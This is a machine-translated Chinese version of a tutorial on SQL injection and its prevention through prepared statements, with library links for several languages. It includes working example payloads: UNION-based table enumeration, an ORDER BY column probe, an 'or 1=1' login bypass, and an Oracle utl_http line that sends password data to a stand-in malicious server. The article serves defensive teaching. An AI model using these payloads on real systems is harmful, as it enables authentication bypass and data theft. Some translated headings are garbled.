<html>
<head>
<title>Security: Preventing SQL Injection (SQLi)</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">安全性:防止SQL注入(SQLi)</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/security-preventing-sql-injection-sqli-ade81c5fd092?source=collection_archive---------1-----------------------#2020-04-18">https://infosecwriteups.com/security-preventing-sql-injection-sqli-ade81c5fd092?source=collection_archive---------1-----------------------#2020-04-18</a></blockquote><div><div class="fc ih ii ij ik il"/><div class="im in io ip iq"><figure class="is it gp gr iu iv gh gi paragraph-image"><div role="button" tabindex="0" class="iw ix di iy bf iz"><div class="gh gi ir"><img src="../Images/57fc0a8c98ea7b950b94b2666e055568.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*NTwLMRZq40UhhEDhciaeVQ.png"/></div></div><figcaption class="jc jd gj gh gi je jf bd b be z dk translated">PortSwigger</figcaption></figure><div class=""/><p id="b70f" class="pw-post-body-paragraph kf kg ji kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc im bi translated">上周我们讨论了<a class="ae ld" href="https://medium.com/@mpreziuso/injection-vulnerabilities-cross-site-scripting-xss-7fd9dc28cc47" rel="noopener">防止跨站点脚本(XSS) </a>:一种源于攻击者将恶意代码注入应用程序客户端的能力的漏洞。</p><p id="b52a" class="pw-post-body-paragraph kf kg ji kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc im bi translated">本周我们将讨论SQL注入攻击:XSS影响应用程序的客户端，而SQLi影响其后端。</p><p id="affa" class="pw-post-body-paragraph kf kg ji kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc im bi translated"><em class="le">在核心</em>处，每当应用程序将不受信任的(应用程序从外部接收的任何东西——通常是用户输入数据)<strong class="kh jj">输入注入到SQL查询中，使得数据被解释为查询逻辑的一部分时，就会出现一个SQL注入漏洞<strong class="kh jj">。</strong></strong></p><h1 id="4a3f" class="lf lg ji bd lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc bi translated">攻击者能做什么？</h1><p id="d9e2" class="pw-post-body-paragraph kf kg ji kh b ki md kk kl km me ko kp kq mf ks kt ku mg kw kx ky mh la lb lc im bi translated">应用程序只是一些数据的包装:真实存在于数据中，对数据的访问、解释和控制存在于应用程序中。</p><p id="acf2" class="pw-post-body-paragraph kf kg ji kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc im bi translated">如果您控制了数据，您就控制了应用程序。</p><blockquote class="mi mj mk"><p id="8586" class="kf kg le kh b ki kj kk kl km kn ko kp ml kr ks kt mm kv kw kx mn kz la lb lc im bi translated"><strong class="kh jj">访问、更改、删除数据</strong>——自明<strong class="kh jj"> <br/>改变一个程序的流程</strong>——通过在一条SQL语句中注入额外的SQL子句，使其意义发生变化。任何下游代码将接收不同的数据，流程将改变<br/> <strong class="kh jj">绕过认证</strong>——如上所述，认证可以绕过<br/> <strong class="kh jj">绕过授权</strong>——如上所述，授权级别可以改变<br/> <strong class="kh jj">远程代码执行</strong>——在某些情况下，攻击者能够在操作系统上执行命令<br/> <strong class="kh jj">拒绝服务</strong>——通过请求过多的数据或利用某些数据库的<a class="ae ld" href="https://mariadb.com/kb/en/benchmark/" rel="noopener ugc nofollow" target="_blank">基准函数</a>。<br/> <strong class="kh jj">数据库转储</strong>——不言自明。所有数据都会泄露。你有麻烦了。</p></blockquote><h1 id="7e63" class="lf lg ji bd lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc bi translated">SQL注入攻击的类型</h1><p id="ee12" class="pw-post-body-paragraph kf kg ji kh b ki md kk kl km me ko kp kq mf ks kt ku mg kw kx ky mh la lb lc im bi translated">这种注入攻击可以分为:</p><ul class=""><li id="da69" class="mo mp ji kh b ki kj km kn kq mq ku mr ky ms lc mt mu mv mw bi translated"><strong class="kh jj">带内SQLi </strong> /经典SQLi: <br/>子类型:基于联合的SQLi、基于错误的SQLi</li><li id="d3f9" class="mo mp ji kh b ki mx km my kq mz ku na ky nb lc mt mu mv mw bi translated">推理SQLi / <strong class="kh jj">盲SQLi </strong> <br/>子类型:基于布尔的盲SQLi，基于时间的盲SQLi</li><li id="72d0" class="mo mp ji kh b ki mx km my kq mz ku na ky nb lc mt mu mv mw bi translated"><strong class="kh jj">带外SQLi </strong></li></ul><h1 id="34f9" class="lf lg ji bd lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc bi translated"><strong class="ak">带内SQL注入</strong></h1><p id="005e" class="pw-post-body-paragraph kf kg ji kh b ki md kk kl km me ko kp kq mf ks kt ku mg kw kx ky mh la lb lc im bi translated">最常见的一类SQL注入攻击:带内攻击是指攻击者使用相同的通信渠道发起攻击并获得结果。</p><h2 id="6226" class="nc lg ji bd lh nd ne dn ll nf ng dp lp kq nh ni lt ku nj nk lx ky nl nm mb nn bi translated">基于联合的SQLi</h2><p id="c8e5" class="pw-post-body-paragraph kf kg ji kh b ki md kk kl km me ko kp kq mf ks kt ku mg kw kx ky mh la lb lc im bi translated"><a class="ae ld" href="https://www.w3schools.com/sql/sql_union.asp" rel="noopener ugc nofollow" target="_blank"> UNION </a>是一个SQL操作符，允许组合两个或多个<a class="ae ld" href="https://www.w3schools.com/sql/sql_union.asp" rel="noopener ugc nofollow" target="_blank"> SELECT </a>语句的结果集。</p><figure class="np nq nr ns gt iv gh gi paragraph-image"><div class="gh gi no"><img src="../Images/959b140ceafcab6ffc94fb1e1a397355.png" data-original-src="https://miro.medium.com/v2/resize:fit:818/format:webp/0*Q9jnDBWMAk8esF2S.png"/></div><figcaption class="jc jd gj gh gi je jf bd b be z dk translated">mysqltutorial.org️</figcaption></figure><p id="b05b" class="pw-post-body-paragraph kf kg ji kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc im bi translated">在这种类型的攻击中，攻击者利用这种能力执行附加语句作为查询的一部分，并在HTTP响应中返回结果。</p><p id="5355" class="pw-post-body-paragraph kf kg ji kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc im bi translated">一般来说，剥削看起来像:</p><pre class="np nq nr ns gt nt nu nv nw aw nx bi"><span id="4d83" class="nc lg ji nu b gy ny nz l oa ob">GET https://my-vulnerable-site.com/product.php?id=1%20UNION%20SELECT%201%20FROM%20information_schema.tables<br/>-- or --<br/>GET https://my-vulnerable-site.com/product.php?id=1 UNION SELECT 1 FROM information_schema.tables</span></pre><p id="a0dd" class="pw-post-body-paragraph kf kg ji kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc im bi translated">这个例子是特定于MySQL的，但是您可以在Oracle中通过选择all_tables来做同样的事情，等等…</p><p id="80f7" class="pw-post-body-paragraph kf kg ji kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc im bi translated">但是这并不容易:因为要合并两个表的结果集，所以模式必须匹配:列数和数据类型必须与原始表的相同。</p><figure class="np nq nr ns gt iv gh gi paragraph-image"><div role="button" tabindex="0" class="iw ix di iy bf iz"><div class="gh gi oc"><img src="../Images/00bd1f8e07a0c1bb5d0a16e8ac1ebf38.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/0*Z3dyGukIlHXWYrsu.gif"/></div></div><figcaption class="jc jd gj gh gi je jf bd b be z dk translated">基于工会的SQLi:有点像保险箱破解——窃贼中的罗伯特·侯赛因</figcaption></figure><ol class=""><li id="1e80" class="mo mp ji kh b ki kj km kn kq mq ku mr ky ms lc od mu mv mw bi translated"><strong class="kh jj">找到准确的列数</strong></li></ol><pre class="np nq nr ns gt nt nu nv nw aw nx bi"><span id="b96a" class="nc lg ji nu b gy ny nz l oa ob">GET <a class="ae ld" href="https://my-vulnerable-site.com/product.php?id=1" rel="noopener ugc nofollow" target="_blank">https://my-vulnerable-site.com/product.php?id=1</a> ORDER BY &lt;X&gt;--</span></pre><p id="172b" class="pw-post-body-paragraph kf kg ji kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc im bi translated">每次启动“X”并增加1可以让您找出原始查询需要多少列:每次尝试您都会看到一些响应，直到您得到一个错误——大致如下:</p><pre class="np nq nr ns gt nt nu nv nw aw nx bi"><span id="1607" class="nc lg ji nu b gy ny nz l oa ob">Unknown column 'X' in order by clause</span></pre><p id="6f4a" class="pw-post-body-paragraph kf kg ji kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc im bi translated">这意味着您已经超过了列数。所以X-1将是列的精确数目。</p><p id="db4c" class="pw-post-body-paragraph kf kg ji kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc im bi translated">2.<strong class="kh jj">找出页面中哪些区域容易受到SQLi的攻击</strong></p><p id="eaed" class="pw-post-body-paragraph kf kg ji kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc im bi translated">请记住，最初的查询检索一些数据并将其显示在页面上，通过使用UNION，我们只是将额外的数据添加到显示在页面上的结果集中。</p><p id="9218" class="pw-post-body-paragraph kf kg ji kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc im bi translated">如果我们像这样运行(一旦我们知道结果集中有5列):</p><pre class="np nq nr ns gt nt nu nv nw aw nx bi"><span id="7ce9" class="nc lg ji nu b gy ny nz l oa ob">GET https://my-vulnerable-site.com/product.php?id=1 UNION ALL SELECT 1,2,3,4,5--</span></pre><p id="470e" class="pw-post-body-paragraph kf kg ji kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc im bi translated">您会在页面上看到一些数据<em class="le">和一些数字:</em> <strong class="kh jj">页面上易受攻击的列的数字！</strong></p><p id="8c32" class="pw-post-body-paragraph kf kg ji kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc im bi translated">这意味着，如果您要用更有用的东西替换一些列号，比如:</p><pre class="np nq nr ns gt nt nu nv nw aw nx bi"><span id="c2fb" class="nc lg ji nu b gy ny nz l oa ob">GET https://my-vulnerable-site.com/product.php?id=1 UNION ALL SELECT 1,2,3,group_concat(table_name),5 FROM information_schema.tables WHERE table_schema = database()--</span></pre><p id="321a" class="pw-post-body-paragraph kf kg ji kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc im bi translated">以前在页面上看到“2”的地方，现在可以看到当前数据库的所有表名。</p><p id="520e" class="pw-post-body-paragraph kf kg ji kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc im bi translated">你可以看到这是如何迅速升级的。</p><h2 id="2b26" class="nc lg ji bd lh nd ne dn ll nf ng dp lp kq nh ni lt ku nj nk lx ky nl nm mb nn bi translated">基于错误的SQLi</h2><p id="ea81" class="pw-post-body-paragraph kf kg ji kh b ki md kk kl km me ko kp kq mf ks kt ku mg kw kx ky mh la lb lc im bi translated">基于错误的SQLi基本上就是我们在找到上面的确切列数时所做的和依赖的:攻击者依靠服务器返回的错误来获取和理解数据库结构。</p><p id="a095" class="pw-post-body-paragraph kf kg ji kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc im bi translated"><strong class="kh jj">专业提示</strong>:语言和框架经常允许你在屏幕上显示错误。这在开发应用程序时非常有用，但在生产系统中应该禁用。</p><h1 id="5a90" class="lf lg ji bd lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc bi translated">盲目SQL注入</h1><p id="eeed" class="pw-post-body-paragraph kf kg ji kh b ki md kk kl km me ko kp kq mf ks kt ku mg kw kx ky mh la lb lc im bi translated">在“带内”攻击中，我们看到攻击者将他们的恶意有效负载发送到服务器，并取回一些数据。</p><p id="b1f4" class="pw-post-body-paragraph kf kg ji kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc im bi translated">但是，如果服务器没有发回数据，我们称之为盲SQLi，因为攻击者无法直接看到他们注入尝试的影响。</p><figure class="np nq nr ns gt iv gh gi paragraph-image"><div class="gh gi oe"><img src="../Images/f226bdde364fb3b03cd2c42d47d58469.png" data-original-src="https://miro.medium.com/v2/resize:fit:1000/0*CFmncFN-I1x6fFUm.gif"/></div></figure><p id="c5d4" class="pw-post-body-paragraph kf kg ji kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc im bi translated">这并不意味着攻击者无法判断攻击是否成功:这只是不太明显，攻击者需要观察应用程序的行为，以了解他们是否能够改变程序的进程。</p><h2 id="730b" class="nc lg ji bd lh nd ne dn ll nf ng dp lp kq nh ni lt ku nj nk lx ky nl nm mb nn bi translated">基于布尔的盲SQLi</h2><p id="e86a" class="pw-post-body-paragraph kf kg ji kh b ki md kk kl km me ko kp kq mf ks kt ku mg kw kx ky mh la lb lc im bi translated">想象一个愚蠢的认证系统:</p><figure class="np nq nr ns gt iv"><div class="bz fp l di"><div class="of og l"/></div></figure><blockquote class="mi mj mk"><p id="ff88" class="kf kg le kh b ki kj kk kl km kn ko kp ml kr ks kt mm kv kw kx mn kz la lb lc im bi translated"><strong class="kh jj">免责声明</strong>:这绝不是你进行认证的方式:不应该使用$_GET，不应该在SQL语句中验证密码，不应该按原样验证密码，<a class="ae ld" href="https://medium.com/@mpreziuso/password-hashing-pbkdf2-scrypt-bcrypt-and-argon2-e25aaf41598e" rel="noopener">你应该散列你的密码</a>，等等…</p></blockquote><p id="d09b" class="pw-post-body-paragraph kf kg ji kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc im bi translated">我确信免责声明对我的读者来说是不必要的，但我在生产中见过类似的代码！😄</p><p id="e710" class="pw-post-body-paragraph kf kg ji kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc im bi translated">如果您要执行以下请求</p><pre class="np nq nr ns gt nt nu nv nw aw nx bi"><span id="dbd2" class="nc lg ji nu b gy ny nz l oa ob">GET https://my-website.com/login.php?username=admin&amp;password=" or "1"="1</span></pre><p id="f19c" class="pw-post-body-paragraph kf kg ji kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc im bi translated">SQL将返回一个大于0的计数(假设表不为空)，在应用程序中该计数将被评估为真。<br/>基本上，您将被认证为<em class="le"> admin </em>，因为SQL将扩展为:</p><pre class="np nq nr ns gt nt nu nv nw aw nx bi"><span id="5949" class="nc lg ji nu b gy ny nz l oa ob">SELECT COUNT(*) FROM user WHERE username = "admin" and password = "" OR "1"="1"</span></pre><p id="a923" class="pw-post-body-paragraph kf kg ji kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc im bi translated">它基本上匹配任何用户名为<em class="le"> admin </em>和空密码或……的用户。“任何其他情况”😅。</p><h2 id="2fc1" class="nc lg ji bd lh nd ne dn ll nf ng dp lp kq nh ni lt ku nj nk lx ky nl nm mb nn bi translated">基于时间的盲SQLi</h2><p id="b872" class="pw-post-body-paragraph kf kg ji kh b ki md kk kl km me ko kp kq mf ks kt ku mg kw kx ky mh la lb lc im bi translated">攻击者发送他的恶意负载，但看不到结果集。</p><p id="af4f" class="pw-post-body-paragraph kf kg ji kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc im bi translated">相反，他们必须观察查询返回需要多长时间。基于此，攻击者可以了解注射是否有效。</p><h1 id="0d6a" class="lf lg ji bd lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc bi translated">带外SQLi</h1><p id="82ff" class="pw-post-body-paragraph kf kg ji kh b ki md kk kl km me ko kp kq mf ks kt ku mg kw kx ky mh la lb lc im bi translated">只有当数据库具有允许进行DNS或HTTP请求的某些功能时，这种形式的攻击才会发生。</p><p id="15c8" class="pw-post-body-paragraph kf kg ji kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc im bi translated">即使在这种情况下，攻击者也无法在攻击后取回数据。因此，他们不得不求助于Oracle的UTL_HTTP包或MSSQL的xp_dirtree命令之类的功能来将结果集发送给自己。</p><p id="a31e" class="pw-post-body-paragraph kf kg ji kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc im bi translated">例如，在Oracle上，您可以创建一个最终评估为(粗体=恶意输入)的请求:</p><pre class="np nq nr ns gt nt nu nv nw aw nx bi"><span id="2178" class="nc lg ji nu b gy ny nz l oa ob">SELECT [some_fields] FROM some_table WHERE field = <strong class="nu jj">SELECT utl_http.request('http://malicious-server.com/?' || (SELECT password FROM users)) FROM DUAL</strong></span></pre><h1 id="d6e6" class="lf lg ji bd lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc bi translated">可以做些什么来防止这一切？</h1><p id="5b5f" class="pw-post-body-paragraph kf kg ji kh b ki md kk kl km me ko kp kq mf ks kt ku mg kw kx ky mh la lb lc im bi translated">很难相信，但答案非常简单:<strong class="kh jj">准备好的报表</strong>。</p><p id="42c5" class="pw-post-body-paragraph kf kg ji kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc im bi oh translated"><span class="l oi oj ok bm ol om on oo op di"> N </span>那现在被认为是一种错误的/过时的思维方式。</p><p id="e57b" class="pw-post-body-paragraph kf kg ji kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc im bi translated"><strong class="kh jj">预准备语句</strong>是一种用于高效地重复执行相同或相似数据库语句的功能:它们就像您的查询的模板一样工作:</p><pre class="np nq nr ns gt nt nu nv nw aw nx bi"><span id="3e77" class="nc lg ji nu b gy ny nz l oa ob">SELECT * FROM products WHERE id = ?<br/>SELECT * FROM products WHERE id = @id<br/>-- etc...: different DBMS have a slightly different notation</span></pre><p id="1010" class="pw-post-body-paragraph kf kg ji kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc im bi translated">数据库解析、执行、翻译然后存储语句，而不执行它。</p><p id="87d5" class="pw-post-body-paragraph kf kg ji kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc im bi translated">只有当应用程序为语句提供值时，这些值才会绑定到语句和检索到的结果集。</p><p id="451b" class="pw-post-body-paragraph kf kg ji kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc im bi translated">因为查询和不可信输入是在不同的时间和不同的上下文中提供的，所以两者不会“混淆”,并且不可信输入不能改变原始查询的含义。</p><p id="4c92" class="pw-post-body-paragraph kf kg ji kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc im bi translated">不同的语言和不同的DBMS意味着不同的库和稍微不同的使用预准备语句的方式。</p><p id="2a74" class="pw-post-body-paragraph kf kg ji kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc im bi translated">我会试着列出每种语言的一些例子。</p><p id="679c" class="pw-post-body-paragraph kf kg ji kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc im bi translated">你的语言/框架不在这个列表中吗？<br/>欢迎留下评论/建议，我会修改列表！</p><p id="4650" class="pw-post-body-paragraph kf kg ji kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc im bi translated">分享就是关心，嗯？😄</p></div><div class="ab cl oq or hx os" role="separator"><span class="ot bw bk ou ov ow"/><span class="ot bw bk ou ov ow"/><span class="ot bw bk ou ov"/></div><div class="im in io ip iq"><h2 id="a91e" class="nc lg ji bd lh nd ne dn ll nf ng dp lp kq nh ni lt ku nj nk lx ky nl nm mb nn bi translated">Native — C# (ASP。网)</h2><p id="82a6" class="pw-post-body-paragraph kf kg ji kh b ki md kk kl km me ko kp kq mf ks kt ku mg kw kx ky mh la lb lc im bi translated"><a class="ae ld" href="https://docs.microsoft.com/en-us/dotnet/api/system.data.sqlclient?view=netframework-4.8" rel="noopener ugc nofollow" target="_blank">系统。Data.SqlClient </a>的<a class="ae ld" href="https://docs.microsoft.com/en-us/dotnet/api/system.data.sqlclient.sqlcommand.prepare?view=netframework-4.8" rel="noopener ugc nofollow" target="_blank"> SqlCommand。准备</a></p><h2 id="6179" class="nc lg ji bd lh nd ne dn ll nf ng dp lp kq nh ni lt ku nj nk lx ky nl nm mb nn bi translated">本地语— Go (Golang)</h2><p id="55c9" class="pw-post-body-paragraph kf kg ji kh b ki md kk kl km me ko kp kq mf ks kt ku mg kw kx ky mh la lb lc im bi translated"><a class="ae ld" href="https://golang.org/pkg/database/sql" rel="noopener ugc nofollow" target="_blank">golang.org/pkg/database/sql</a>的<a class="ae ld" href="https://golang.org/pkg/database/sql/#DB.Prepare" rel="noopener ugc nofollow" target="_blank">分贝。准备</a></p><h2 id="a18e" class="nc lg ji bd lh nd ne dn ll nf ng dp lp kq nh ni lt ku nj nk lx ky nl nm mb nn bi translated">本机— Java</h2><p id="25a5" class="pw-post-body-paragraph kf kg ji kh b ki md kk kl km me ko kp kq mf ks kt ku mg kw kx ky mh la lb lc im bi translated"><a class="ae ld" href="https://docs.oracle.com/en/java/javase/12/docs/api/java.sql/java/sql/package-summary.html" rel="noopener ugc nofollow" target="_blank"> java.sql </a>的<a class="ae ld" href="https://docs.oracle.com/en/java/javase/12/docs/api/java.sql/java/sql/PreparedStatement.html" rel="noopener ugc nofollow" target="_blank"> PreparedStatement </a></p><h2 id="fdbd" class="nc lg ji bd lh nd ne dn ll nf ng dp lp kq nh ni lt ku nj nk lx ky nl nm mb nn bi translated">本机— PHP</h2><p id="f773" class="pw-post-body-paragraph kf kg ji kh b ki md kk kl km me ko kp kq mf ks kt ku mg kw kx ky mh la lb lc im bi translated"><a class="ae ld" href="https://www.php.net/manual/en/mysqli.quickstart.prepared-statements.php" rel="noopener ugc nofollow" target="_blank">准备好的报表</a></p></div><div class="ab cl oq or hx os" role="separator"><span class="ot bw bk ou ov ow"/><span class="ot bw bk ou ov ow"/><span class="ot bw bk ou ov"/></div><div class="im in io ip iq"><h2 id="ab04" class="nc lg ji bd lh nd ne dn ll nf ng dp lp kq nh ni lt ku nj nk lx ky nl nm mb nn bi translated">node-MySQL 2-JS(NodeJS)</h2><p id="9ce9" class="pw-post-body-paragraph kf kg ji kh b ki md kk kl km me ko kp kq mf ks kt ku mg kw kx ky mh la lb lc im bi translated"><a class="ae ld" href="https://github.com/sidorares/node-mysql2" rel="noopener ugc nofollow" target="_blank">节点-MySQL2 </a>的<a class="ae ld" href="https://github.com/sidorares/node-mysql2" rel="noopener ugc nofollow" target="_blank">准备好的报表</a></p><h2 id="8db4" class="nc lg ji bd lh nd ne dn ll nf ng dp lp kq nh ni lt ku nj nk lx ky nl nm mb nn bi translated">PGX围棋(戈朗)</h2><p id="1959" class="pw-post-body-paragraph kf kg ji kh b ki md kk kl km me ko kp kq mf ks kt ku mg kw kx ky mh la lb lc im bi translated">github.com/jackg/pgx号<a class="ae ld" href="https://pkg.go.dev/github.com/jackc/pgx" rel="noopener ugc nofollow" target="_blank">号</a><a class="ae ld" href="https://pkg.go.dev/github.com/jackc/pgx?tab=doc#Conn.Prepare" rel="noopener ugc nofollow" target="_blank">号控制室准备</a></p><h2 id="fa89" class="nc lg ji bd lh nd ne dn ll nf ng dp lp kq nh ni lt ku nj nk lx ky nl nm mb nn bi translated">Psycopg — Python</h2><p id="5f05" class="pw-post-body-paragraph kf kg ji kh b ki md kk kl km me ko kp kq mf ks kt ku mg kw kx ky mh la lb lc im bi translated"><a class="ae ld" href="https://www.psycopg.org/articles/2012/10/01/prepared-statements-psycopg/" rel="noopener ugc nofollow" target="_blank">在Psycopg中准备好语句</a></p></div></div>    
</body>
</html>